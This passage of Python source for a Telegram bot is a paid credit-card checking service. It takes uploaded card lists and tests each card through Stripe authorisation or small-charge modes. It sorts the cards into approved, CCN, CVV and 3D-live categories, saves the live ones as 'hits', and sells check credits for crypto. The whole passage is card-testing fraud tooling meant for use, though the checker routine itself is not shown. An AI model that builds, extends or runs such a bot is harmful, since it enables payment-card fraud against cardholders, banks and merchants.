𝟯. 𝗦𝗲𝗻𝗱 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗/𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝘁𝗼 @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬
𝟰. 𝗪𝗮𝗶𝘁 𝗳𝗼𝗿 𝗰𝗼𝗻𝗳𝗶𝗿𝗺𝗮𝘁𝗶𝗼𝗻
        
*𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀:*
"""
        
        for method, address in self.payment_addresses.items():
            packages_text += f"• *{method}:* `{address}`\n"
        
        keyboard = [
            [InlineKeyboardButton("💰 𝟭𝟬𝟬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ($𝟭)", callback_data="buy_100")],
            [InlineKeyboardButton("💰 𝟱𝟬𝟬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ($𝟰)", callback_data="buy_500")],
            [InlineKeyboardButton("💰 𝟭𝟬𝟬𝟬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ($𝟳)", callback_data="buy_1000")],
            [InlineKeyboardButton("📸 𝗦𝗘𝗡𝗗 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗜𝗗", callback_data="send_trx")],
            [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                packages_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                packages_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def show_category_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE, category: str):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if user_id not in self.user_sessions:
            await query.edit_message_text(
                "❌ *𝗡𝗼 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗳𝗼𝘂𝗻𝗱.*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝘁𝗮𝗿𝘁 𝗮 𝗻𝗲𝘄 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝗳𝗶𝗿𝘀𝘁.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        session = self.user_sessions[user_id]
        categorized = session.get('categorized_cards', {})
        cards = categorized.get(category, [])
        
        if not cards:
            await query.edit_message_text(
                f"📭 *𝗡𝗼 {category} 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.*",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        card_list = "\n".join([f"• `{card}`" for card in cards[:20]])
        
        if len(cards) > 20:
            card_list += f"\n\n📄 *... and {len(cards) - 20} more cards*"
        
        file_content = "\n".join(cards)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{category}_{timestamp}.txt"
        
        text = f"""
📁 *{category} 𝗖𝗮𝗿𝗱𝘀 ({len(cards)})*

{card_list}
"""
        
        keyboard = [
            [InlineKeyboardButton("📥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗜𝗟𝗘", callback_data=f"download_{category}")],
            [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_results")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    async def save_approved_card(self, user_id: int, username: str, card_data: Dict, mode: str):
        try:
            HitsManager.add_hit(user_id, username, card_data, mode)
            print(f"✅ Saved approved card for user {user_id} ({username})")
        except Exception as e:
            print(f"❌ Error saving approved card: {e}")
    
    async def process_cards(self, user_id: int, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if user_id not in self.user_sessions:
            return
        
        session = self.user_sessions[user_id]
        cards = session['cards']
        mode = session['mode']
        stats = session['stats']
        categorized = session['categorized_cards']
        user_credits = session['user_credits']
        user_free_checks = session['user_free_checks']
        
        checker = self.get_current_checker(mode)
        
        if mode == "stripe_auth":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
        elif mode == "stripe_charge":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭"
        elif mode == "stripe_charge50":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬"
        else:
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
            
        initial_text = f"""
*📁 𝗙𝗜𝗟𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗*
        
📄 *𝗙𝗶𝗹𝗲:* `{update.message.document.file_name}`
🔧 *𝗠𝗼𝗱𝗲:* `{mode_text}`
🎴 *𝗖𝗮𝗿𝗱𝘀:* `{len(cards)}`
💳 *𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{user_credits}`
🎁 *𝗙𝗿𝗲𝗲 𝗖𝗵𝗲𝗰𝗸𝘀:* `{user_free_checks}`
⏰ *𝗦𝘁𝗮𝗿𝘁𝗲𝗱:* `{time.strftime('%I:%M %p')}`
🏦 *𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽:* `𝗘𝗻𝗮𝗯𝗹𝗲𝗱`
        
⏳ *𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝘄𝗵𝗶𝗹𝗲 𝗜 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝘁𝗵𝗲 𝗰𝗮𝗿𝗱𝘀...*
        
*💡 𝗖𝗥𝗘𝗗𝗜𝗧 𝗗𝗘𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗥𝗨𝗟𝗘𝗦:*
• 📝 *𝗔𝗡𝗬 𝗖𝗔𝗥𝗗:* 𝟭 𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸 𝗼𝗿 𝟭 𝗰𝗿𝗲𝗱𝗶𝘁 (𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗶𝗻𝘀𝘁𝗮𝗻𝘁𝗹𝘆)
• 🔥 *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗:* +𝟭 𝗮𝗱𝗱𝗶𝘁𝗶𝗼𝗻𝗮𝗹 𝗰𝗿𝗲𝗱𝗶𝘁 (𝗳𝗿𝗼𝗺 𝗮𝗱𝗺𝗶𝗻-𝗴𝗶𝘃𝗲𝗻 𝗰𝗿𝗲𝗱𝗶𝘁𝘀)
        
*𝗖𝗹𝗶𝗰𝗸 𝗮𝗻𝘆 𝗯𝘂𝘁𝘁𝗼𝗻 𝗯𝗲𝗹𝗼𝘄 𝗳𝗼𝗿 𝗿𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝘀𝘁𝗮𝘁𝘀!*
        """
        
        initial_buttons = await self.create_processing_buttons(
            {"card": "𝗪𝗮𝗶𝘁𝗶𝗻𝗴...", "status": "𝗪𝗔𝗜𝗧𝗜𝗡𝗚", "emoji": "⏳", "status_message": "𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴", "bank": "𝗟𝗼𝗮𝗱𝗶𝗻𝗴...", "country": "𝗟𝗼𝗮𝗱𝗶𝗻𝗴...", "bin_info": {"scheme": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "type": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"}, "vbv_status": {"status": "⏳", "description": "Starting..."}},
            stats, 0, len(cards), mode, user_credits, user_free_checks
        )
        
        try:
            msg = await update.message.reply_text(
                initial_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=initial_buttons
            )
            
            session['status_message'] = msg
            
        except BadRequest as e:
            print(f"Error sending message: {e}")
            msg = await update.message.reply_text(
                initial_text,
                parse_mode=ParseMode.MARKDOWN
            )
            session['status_message'] = msg
        
        try:
            for i, card in enumerate(cards):
                if not session.get('active', True):
                    await msg.edit_text(
                        "*⏸️ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝘁𝗼𝗽𝗽𝗲𝗱 𝗯𝘆 𝘂𝘀𝗲𝗿.*\n\n"
                        f"*📊 𝗖𝗮𝗿𝗱𝘀 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱 𝗯𝗲𝗳𝗼𝗿𝗲 𝘀𝘁𝗼𝗽𝗽𝗶𝗻𝗴:* `{len(session['all_results'])}`\n"
                        f"*🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗/𝗔𝗨𝗧𝗛:* `{stats.get('APPROVED', 0)}`\n"
                        f"*❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗:* `{stats.get('DECLINED', 0)}`\n"
                        f"*💳 𝗖𝗿𝗲𝗱𝗶𝘁𝘀 𝘂𝘀𝗲𝗱:* `{session.get('credits_deducted_for_checks', 0) + session.get('credits_deducted_for_approved', 0)}`\n\n"
                        "*𝗬𝗼𝘂 𝗰𝗮𝗻 𝘀𝘁𝗶𝗹𝗹 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝘁𝗵𝗲 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄.*",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    break
                
                # Deduct 1 credit/free check for checking this card (happens instantly)
                if not UserDatabase.is_admin(user_id):
                    success = await self.deduct_credits(user_id, "check")
                    if not success:
                        await update.message.reply_text(
                            "❌ *𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗰𝗿𝗲𝗱𝗶𝘁𝘀!*\n\n"
                            "𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗲𝗻𝗼𝘂𝗴𝗵 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝗼𝗿 𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲.\n"
                            "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝘁𝗼𝗽𝗽𝗲𝗱.",
                            parse_mode=ParseMode.MARKDOWN
                        )
                        session['active'] = False
                        break
                    
                    # Update session credits
                    session['credits_deducted_for_checks'] = session.get('credits_deducted_for_checks', 0) + 1
                    
                    # Refresh user data
                    user = UserDatabase.get_user(user_id)
                    if user:
                        session['user_credits'] = user.get("credits", 0)
                        session['user_free_checks'] = user.get("free_checks_available", 0)
                
                result = checker.process_card(card)
                
                if result is None:
                    result = {
                        "card": card,
                        "status": "𝗘𝗥𝗥𝗢𝗥",
                        "emoji": "❌",
                        "status_message": "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗳𝗮𝗶𝗹𝗲𝗱",
                        "bank": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻",
                        "country": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻",
                        "bin_info": {"scheme": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "type": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"},
                        "vbv_status": {"status": "⚠️", "description": "Processing failed"},
                        "response": "𝗡𝗼𝗻𝗲 𝗿𝗲𝘀𝘂𝗹𝘁"
                    }
                
                card_data = checker.parse_card(card)
                
                session['all_results'].append(result)
                
                status = result['status'].replace("𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗", "APPROVED").replace("𝗖𝗖𝗡", "CCN").replace("𝗖𝗩𝗩", "CVV").replace("𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗", "DECLINED").replace("𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦", "INSUFFICIENT_FUNDS").replace("𝟯𝗗 𝗟𝗜𝗩𝗘", "3D_LIVE").replace("𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", "STRIPE_AUTH").replace("𝗘𝗥𝗥𝗢𝗿", "ERROR").replace("𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "UNKNOWN")
                
                if "APPROVED" in status:
                    stats['APPROVED'] += 1
                    categorized['APPROVED'].append(result['card'])
                    
                    if card_data:
                        user = UserDatabase.get_user(user_id)
                        username = user.get("username", "Unknown") if user else "Unknown"
                        await self.save_approved_card(user_id, username, card_data, mode)
                    
                    # Deduct additional 1 credit for approved cards (from admin-given credits only)
                    if not UserDatabase.is_admin(user_id):
                        success = await self.deduct_credits(user_id, "approved")
                        if success:
                            session['credits_deducted_for_approved'] = session.get('credits_deducted_for_approved', 0) + 1
                            # Refresh user data
                            user = UserDatabase.get_user(user_id)
                            if user:
                                session['user_credits'] = user.get("credits", 0)
                
                elif "CCN" in status:
                    stats['CCN'] += 1
                    categorized['CCN'].append(result['card'])
                elif "CVV" in status:
                    stats['CVV'] += 1
                    categorized['CVV'].append(result['card'])
                elif "INSUFFICIENT_FUNDS" in status:
                    stats['INSUFFICIENT_FUNDS'] += 1
                    categorized['INSUFFICIENT_FUNDS'].append(result['card'])
                elif "DECLINED" in status:
                    stats['DECLINED'] += 1
                    categorized['DECLINED'].append(result['card'])
                elif "3D_LIVE" in status:
                    stats['3D_LIVE'] += 1
                    categorized['3D_LIVE'].append(result['card'])
                elif "STRIPE_AUTH" in status:
                    stats['STRIPE_AUTH'] += 1
                    categorized['STRIPE_AUTH'].append(result['card'])
                elif "ERROR" in status:
                    stats['ERROR'] += 1
                    categorized['ERROR'].append(result['card'])
                else:
                    stats['UNKNOWN'] += 1
                    categorized['UNKNOWN'].append(result['card'])
                
                await self.update_user_stats(user_id, result['status'])
                
                current = i + 1
                total = len(cards)
                
                message_text = await self.create_status_message(result, stats, current, total, mode, session['user_credits'], session['user_free_checks'])
                
                try:
                    buttons = await self.create_processing_buttons(result, stats, current, total, mode, session['user_credits'], session['user_free_checks'])
                    await msg.edit_text(
                        message_text,
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=buttons
                    )
                except BadRequest as e:
                    await msg.edit_text(
                        message_text,
                        parse_mode=ParseMode.MARKDOWN
                    )
                
                if session['user_credits'] <= 0 and session['user_free_checks'] <= 0 and not UserDatabase.is_admin(user_id):
                    await update.message.reply_text(
                        "⚠️ *𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗿𝘂𝗻 𝗼𝘂𝘁 𝗼𝗳 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝗮𝗻𝗱 𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀!*\n\n"
                        "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝘁𝗼𝗽𝗽𝗲𝗱.\n"
                        "𝗨𝘀𝗲 /𝗯𝘂𝘆𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗺𝗼𝗿𝗲 𝗰𝗿𝗲𝗱𝗶𝘁𝘀.",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    session['active'] = False
                    break
                
                if current < total:
                    if mode == "stripe_auth":
                        await asyncio.sleep(8)
                    elif mode == "stripe_charge":
                        await asyncio.sleep(random.uniform(2, 3))
                    elif mode == "stripe_charge50":
                        await asyncio.sleep(random.uniform(2, 3))
                    else:
                        await asyncio.sleep(5)
            
            if session.get('active', True):
                await self.send_final_results(user_id, update, context, session)
            else:
                await update.message.reply_text(
                    f"*⏸️ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝘁𝗼𝗽𝗽𝗲𝗱. 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱 {len(session['all_results'])} 𝗰𝗮𝗿𝗱𝘀.*\n\n"
                    f"*💳 𝗧𝗼𝘁𝗮𝗹 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘂𝘀𝗲𝗱:* `{session.get('credits_deducted_for_checks', 0) + session.get('credits_deducted_for_approved', 0)}`\n"
                    f"  - 📝 *𝗙𝗼𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴:* `{session.get('credits_deducted_for_checks', 0)}`\n"
                    f"  - 🔥 *𝗙𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱:* `{session.get('credits_deducted_for_approved', 0)}`\n\n"
                    "*𝗬𝗼𝘂 𝗰𝗮𝗻 𝘀𝘁𝗶𝗹𝗹 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝘁𝗵𝗲 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄.*",
                    parse_mode=ParseMode.MARKDOWN
                )
            
        except Exception as e:
            print(f"𝗘𝗿𝗿𝗼𝗿 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀_𝗰𝗮𝗿𝗱𝘀: {e}")
            error_msg = f"*❌ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗲𝗿𝗿𝗼𝗿:* `{str(e)[:100]}`"
            try:
                await msg.edit_text(error_msg, parse_mode=ParseMode.MARKDOWN)
            except:
                await update.message.reply_text(error_msg, parse_mode=ParseMode.MARKDOWN)
        finally:
            if user_id in self.active_processes:
                self.active_processes[user_id] = False
    
    async def create_processing_buttons(self, card_info: Dict, stats: Dict, current: int, total: int, mode: str, user_credits: int, user_free_checks: int) -> InlineKeyboardMarkup:
        buttons = []
        
        if mode == "stripe_auth":
            mode_text = "🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛"
        elif mode == "stripe_charge":
            mode_text = "💰 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟭"
        elif mode == "stripe_charge50":
            mode_text = "💵 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟬.𝟱𝟬"
        else:
            mode_text = "🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛"
            
        buttons.append([InlineKeyboardButton(mode_text, callback_data="mode_info")])
        
        credits_text = f"💳 𝗖𝗥𝗘𝗗𝗜𝗧𝗦: {user_credits}"
        if user_free_checks > 0:
            credits_text += f" | 🎁 𝗙𝗥𝗘𝗘: {user_free_checks}"
        buttons.append([InlineKeyboardButton(credits_text, callback_data="credits_info")])
        
        card_display = card_info.get('card', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        if len(card_display) > 30:
            card_display = card_display[:27] + "..."
        buttons.append([InlineKeyboardButton(f"🎴 {card_display}", callback_data="current_card")])
        
        bank = card_info.get('bank', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        country = card_info.get('country', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        bin_info_text = f"🏦 {bank[:15]}... | {country}"
        buttons.append([InlineKeyboardButton(bin_info_text, callback_data="bin_info")])
        
        vbv_status = card_info.get('vbv_status', {})
        vbv_text = f"🔒 𝗩𝗕𝗩: {vbv_status.get('status', '❓')} {vbv_status.get('description', 'Checking...')[:20]}"
        buttons.append([InlineKeyboardButton(vbv_text, callback_data="vbv_info")])
        
        status = card_info.get('status', '𝗨𝗡𝗞𝗡𝗢𝗪𝗡')
        emoji = card_info.get('emoji', '❓')
        status_message = card_info.get('status_message', '')
        
        if len(status_message) > 30:
            status_message = status_message[:27] + "..."
        
        if status == "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗":
            status_text = f"𝗦𝗧𝗔𝗧𝗨𝗦 → ❌ 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝘄𝗮𝘀 𝗱𝗲𝗰𝗹𝗶𝗻𝗲𝗱."
        elif status_message and status_message != '𝗨𝗡𝗞𝗡𝗢𝗪𝗡_𝗘𝗥𝗥𝗢𝗥':
            status_text = f"𝗦𝗧𝗔𝗧𝗨𝗦 → {emoji} {status_message}"
        else:
            status_text = f"𝗦𝗧𝗔𝗧𝗨𝗦 → {emoji} {status}"
        
        buttons.append([InlineKeyboardButton(status_text, callback_data="status_info")])
        
        buttons.append([InlineKeyboardButton(f"🔥 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 [{stats.get('APPROVED', 0)}]", callback_data="show_APPROVED")])
        buttons.append([InlineKeyboardButton(f"✅ 𝗖𝗖𝗡 [{stats.get('CCN', 0)}]", callback_data="show_CCN")])
        buttons.append([InlineKeyboardButton(f"✅ 𝗖𝗩𝗩 [{stats.get('CVV', 0)}]", callback_data="show_CVV")])
        buttons.append([InlineKeyboardButton(f"💰 𝗟𝗢𝗪 𝗙𝗨𝗡𝗗𝗦 [{stats.get('INSUFFICIENT_FUNDS', 0)}]", callback_data="show_INSUFFICIENT_FUNDS")])
        buttons.append([InlineKeyboardButton(f"❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 [{stats.get('DECLINED', 0)}]", callback_data="show_DECLINED")])
        buttons.append([InlineKeyboardButton(f"✅ 𝟯𝗗 𝗟𝗜𝗩𝗘 [{stats.get('3D_LIVE', 0)}]", callback_data="show_3D_LIVE")])
        
        if mode == "stripe_auth":
            buttons.append([InlineKeyboardButton(f"🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 [{stats.get('STRIPE_AUTH', 0)}]", callback_data="show_STRIPE_AUTH")])
        
        buttons.append([InlineKeyboardButton(f"📊 𝗧𝗢𝗧𝗔𝗟 [{total}]", callback_data="show_TOTAL")])
        
        elapsed = time.time() - self.user_sessions.get('start_time', time.time())
        speed = current / elapsed if elapsed > 0 else 0
        buttons.append([InlineKeyboardButton(f"⚡ 𝗦𝗣𝗘𝗘𝗗 → {speed:.1f} 𝗰𝗮𝗿𝗱𝘀/𝘀𝗲𝗰", callback_data="show_speed")])
        
        buttons.append([InlineKeyboardButton("⏸️ 𝗦𝗧𝗢𝗣 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚", callback_data="stop_command")])
        
        return InlineKeyboardMarkup(buttons)
    
    async def create_status_message(self, card_info: Dict, stats: Dict, current: int, total: int, mode: str, user_credits: int, user_free_checks: int) -> str:
        current_time = time.strftime('%I:%M %p')
        
        elapsed = time.time() - self.user_sessions.get('start_time', time.time())
        speed = current / elapsed if elapsed > 0 else 0
        
        bank = card_info.get('bank', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        country = card_info.get('country', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        scheme = card_info.get('bin_info', {}).get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        card_type = card_info.get('bin_info', {}).get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
        vbv_status = card_info.get('vbv_status', {})
        
        if mode == "stripe_auth":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
        elif mode == "stripe_charge":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭"
        elif mode == "stripe_charge50":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬"
        else:
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
        
        free_checks_msg = f"\n🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{user_free_checks}`\n" if user_free_checks > 0 else "\n"
        
        message = f"""
*🔍 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗖𝗔𝗥𝗗 ({mode_text})*
        
*𝗧𝗶𝗺𝗲:* `{current_time}`
*𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{user_credits}`{free_checks_msg}
🎴 *𝗖𝗮𝗿𝗱:* `{card_info.get('card', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')}`
🏦 *𝗕𝗮𝗻𝗸:* `{bank}`
📍 *𝗖𝗼𝘂𝗻𝘁𝗿𝘆:* `{country}`
💳 *𝗧𝘆𝗽𝗲:* `{scheme} {card_type}`
🔒 *𝗩𝗕𝗩:* `{vbv_status.get('status', '❓')} {vbv_status.get('description', 'Checking...')}`
        
📈 *𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀:* `{current}/{total}` 𝗰𝗮𝗿𝗱𝘀
⚡ *𝗦𝗽𝗲𝗲𝗱:* `{speed:.1f}` 𝗰𝗮𝗿𝗱𝘀/𝘀𝗲𝗰
🤟 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @𝗚𝗿𝗮𝗻𝗱𝗦𝗶𝗟𝗲𝘀 | 𝗔𝗱𝗺𝗶𝗻: @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬
        """
        
        return message
    
    async def send_final_results(self, user_id: int, update: Update, context: ContextTypes.DEFAULT_TYPE, session: Dict):
        stats = session['stats']
        mode = session['mode']
        user_credits = session['user_credits']
        user_free_checks = session['user_free_checks']
        credits_for_checks = session.get('credits_deducted_for_checks', 0)
        credits_for_approved = session.get('credits_deducted_for_approved', 0)
        total_credits_used = credits_for_checks + credits_for_approved
        
        if mode == "stripe_auth":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
        elif mode == "stripe_charge":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭"
        elif mode == "stripe_charge50":
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬"
        else:
            mode_text = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘁𝗵"
            
        processing_time = time.time() - session['start_time']
        minutes = int(processing_time // 60)
        seconds = int(processing_time % 60)
        
        free_checks_msg = f"\n🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{user_free_checks}`\n" if user_free_checks > 0 else "\n"
        
        final_text = f"""
🎉 *𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!*
        
🔧 *𝗠𝗼𝗱𝗲:* `{mode_text}`
💳 *𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{user_credits}`{free_checks_msg}
📊 *𝗙𝗜𝗡𝗔𝗟 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦:*
• *𝗧𝗢𝗧𝗔𝗟 𝗖𝗔𝗥𝗗𝗦:* `{stats['TOTAL']}`
• *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗:* `{stats.get('APPROVED', 0)}`
• *💳 𝗧𝗼𝘁𝗮𝗹 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘂𝘀𝗲𝗱:* `{total_credits_used}`
  - 📝 *𝗙𝗼𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴:* `{credits_for_checks}`
  - 🔥 *𝗙𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱:* `{credits_for_approved}`
• ⏱️ *𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗧𝗶𝗺𝗲:* `{minutes}𝗺 {seconds}𝘀`
"""
        
        if processing_time > 0:
            speed = stats['TOTAL'] / processing_time
            final_text += f"?? *𝗦𝗽𝗲𝗲𝗱:* `{speed:.1f} 𝗰𝗮𝗿𝗱𝘀/𝘀𝗲𝗰`\n"
        
        final_text += "\n📁 *𝗖𝗹𝗶𝗰𝗸 𝗮𝗻𝘆 𝗯𝘂𝘁𝘁𝗼𝗻 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘃𝗶𝗲𝘄/𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗰𝗮𝗿𝗱𝘀:*"
        
        buttons = await self.create_final_buttons(stats, mode, user_credits, user_free_checks)
        
        await update.message.reply_text(
            final_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=buttons
        )
    
    async def create_final_buttons(self, stats: Dict, mode: str, user_credits: int, user_free_checks: int) -> InlineKeyboardMarkup:
        buttons = []
        
        categories = [
            ("🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗" if mode == "stripe_charge" else "🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", "APPROVED"),
            ("✅ 𝗖𝗖𝗡", "CCN"),
            ("✅ 𝗖𝗩𝗩", "CVV"),
